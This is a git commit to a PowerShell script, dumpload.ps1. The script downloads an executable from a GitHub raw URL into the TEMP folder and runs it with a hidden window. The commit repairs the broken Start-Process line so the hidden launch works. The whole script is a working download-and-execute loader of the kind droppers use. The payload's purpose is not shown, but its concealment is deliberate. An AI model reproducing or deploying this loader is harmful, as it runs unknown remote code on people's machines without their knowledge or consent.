8efb801337d632e05b76a7b0358d1f8ed8430325
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-05-01 19:16:23 +0700

    Update dumpload.ps1

--- dumpload.ps1
+++ dumpload.ps1
@@ -1,4 +1,4 @@
 $url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
 $output5 = "$env:TEMP\dump.exe"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
-Start-Process -FilePath Start-Process -FilePath "$env:TEMP\dump.exe" -WindowStyle Hidden -WindowStyle Hidden
+Start-Process -FilePath "$env:TEMP\dump.exe" -WindowStyle Hidden
